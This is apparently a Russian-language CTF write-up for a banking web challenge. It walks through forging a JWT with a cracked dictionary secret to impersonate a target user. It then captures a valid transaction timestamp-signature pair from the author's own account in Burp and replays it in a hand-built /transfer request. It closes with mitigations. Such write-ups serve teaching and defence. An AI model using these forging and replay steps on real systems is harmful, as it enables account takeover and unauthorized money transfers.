## Что сказано в условии

То же, что и в v1: цель — `mgalankov@4274`, `user_id = 10` (по факту в свежей сидинговой БД он `4`).

В v2 разработчики «подкрутили» две вещи:

- В неподтверждённой транзакции (`skip_pin=1`) поле `signature` теперь `None` — с чека уже ничего не подсмотришь.
- `/receipt/<id>` редиректит неподтверждённые транзакции в `/verify_transaction/<id>`.

Зато **исчезла привязка подписи к пользователю** в `/transfer`-эндпоинте. В этом и работает новый эксплоит — **инъекция чужой валидной пары** `transaction_timestamp + transaction_signature` в форму подтверждения покупки FLAG_SHOP.

## Шаг 3. На [jwt.io](http://jwt.io) подделываем JWT под `mgalankov@4274`

На **[jwt.io](http://jwt.io)**:

1. Слева — наш текущий JWT.
2. Внизу в **VERIFY SIGNATURE → secret** вписываем `ifeveryonecared3`, видим зелёное «Signature Verified».
3. В payload меняем `"sub"` на `"10"`, `"username"` — на `"mgalankov@4274"`. По вкусу — отодвигаем `exp`.
4. Слева получаем новый токен.

В Burp — Match & Replace по cookie, либо вручную в Repeater:

```
Cookie: access_token_cookie=<подделанный JWT под mgalankov>
```

Запрос `GET /dashboard` — ответ показывает аккаунт mgalankov-а (баланс 1.5 млн, история семи переводов). Мы внутри.

## Шаг 6. Параллельно достаём «честную» пару `(timestamp, signature)`

## из своей собственной учётки

Открываем **второе** окно браузера (или второй профиль), логинимся **под обычным пользователем**, которого зарегали на шаге 1. PIN свой — мы его знаем.

Делаем «штатный» перевод между своими счетами (например, переводим 1 рубль с `ACC003` на `ACC001` или на любой другой существующий счёт) до момента ввода PIN. Включаем перехват в Burp.

JS в `transfer.html` сначала шлёт XHR на `/api/get_signature` с PIN-ом. Перехватываем ответ:

```http
POST /api/get_signature HTTP/1.1
Cookie: access_token_cookie=<JWT нашего собственного юзера>
Content-Type: application/json

{"pin_code":"12345678"}
```

Ответ:

```json
{
  "date": "2026-04-25",
  "time": "00:11:02",
  "timestamp": 1745532662,
  "signature": "9f3b81c4ea5d6178"
}
```

Эта пара `timestamp=1745532662, signature=9f3b81c4ea5d6178` — **математически валидна**. Сервер сгенерировал её именно для нашего юзера, но в `/transfer` эта привязка **не проверяется**. Это и есть дыра.

Записываем пару, перехватываем дальше — следом JS соберёт большую POST-форму на `/transfer`. Её отправлять **не надо**, нам нужен был только перехват ответа `/api/get_signature`. Дропаем запрос.

## Шаг 7. Подтверждаем покупку FLAG_SHOP под cookie mgalankov-а

Возвращаемся в окно/вкладку с подделанным JWT. Открываем форму перевода FLAG_SHOP (шаг 5). В Burp ловим **первый шаг** (POST на `/transfer`, тот, что `pinForm` отправляет XHR-ом на `/api/get_signature`) — на самом деле проще ловить тот самый второй POST после ввода PIN. Но мы PIN-а не знаем.

### Решение: собираем нужный POST вручную в Burp Repeater

Берём шаблон обычного `/transfer`-сабмита и руками заполняем поля:

```http
POST /transfer HTTP/1.1
Host: target
Cookie: access_token_cookie=<подделанный JWT под mgalankov>
Content-Type: application/x-www-form-urlencoded

to_account=FLAG_SHOP
&amount=1000.00
&description=%D0%9F%D0%BE%D0%BA%D1%83%D0%BF%D0%BA%D0%B0%3A+%D0%A4%D0%BB%D0%B0%D0%B3+%D0%BE%D1%82+CTF+%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D1%8F
&product_id=1
&token=t_8a3f...
&transaction_date=2026-04-25
&transaction_time=00:11:02
&transaction_timestamp=1745532662
&transaction_signature=9f3b81c4ea5d6178
```

Главное — **не должно быть** `skip_pin=1` (иначе пойдёт другая ветка), и обязательно есть оба поля `transaction_timestamp` + `transaction_signature`, взятые из нашего честного `/api/get_signature` (Шаг 6).

Жмём **Send**.

Сервер делает:

1. Проверяет, что мы — `mgalankov@4274` (мы, потому что подделанный JWT).
2. Берёт `transaction_timestamp = 1745532662`, считает заново подпись по этому timestamp — получает то же `9f3b81c4ea5d6178`.
3. Сравнивает: `transaction_signature == verification_signature` — да.
4. Никакой проверки «а кому эту подпись выдавал сервер» нет — здесь и проседает безопасность.
5. Для `to_account=FLAG_SHOP` сервер сам сдвигает дату на +7 дней и пересчитывает подпись по новому timestamp, кладёт транзакцию как `is_verified=True`.
6. Дёргает Telegram-бота `/api/approve_purchase` — флаг прилетает в TG.

В ответе видим редирект на `/flag_shop` и зелёный баннер «Покупка подтверждена! Флаг отправлен в Telegram бот.»

## Альтернатива — даже проще

Конкретно для `FLAG_SHOP` сервер всё равно перезапишет `transaction_signature` своим расчётом для `t+7d`. То есть в этой ветке **значение подписи фактически не проверяется** — лишь бы поле было.

Если совсем лень доставать честную подпись из своей сессии, можно отправить:

```
transaction_timestamp=1745532662
transaction_signature=0000000000000000
```

…и FLAG_SHOP-ветка сработает ровно так же. Но «правильная» демонстрация бага — именно инъекция чужой валидной подписи: в general-case (не FLAG_SHOP) эта дыра позволяет делать **любые переводы со счёта mgalankov без знания его PIN** — что и есть основной риск.

---

## Кратко — почему это работает

1. JWT-секрет всё ещё словарный (`ifeveryonecared3`), берётся из rockyou.
2. В `/transfer` (ветка с `transaction_signature`) исчезла серверная привязка выпущенной подписи к юзеру и к параметрам — любая валидная пара `(timestamp, sig)` принимается.
3. Свою собственную валидную пару легко добываем через `/api/get_signature` на своей же учётке (PIN свой) и подсовываем в запрос под подделанным JWT mgalankov-а.

---

## Mitigation

- Привязывать выпущенную подпись к `(user_id, to_account, amount, description)` в одноразовом whitelist (как сделано в `signature_session.py` версии v1, но по какой-то причине удалено в v2).
- На уровне бизнес-логики FLAG_SHOP не «подменять» подпись на серверную, а выдавать клиенту правильный timestamp заранее и проверять подпись честно.
- JWT/Flask-секреты — длинные случайные, через env, никаких словарных слов.
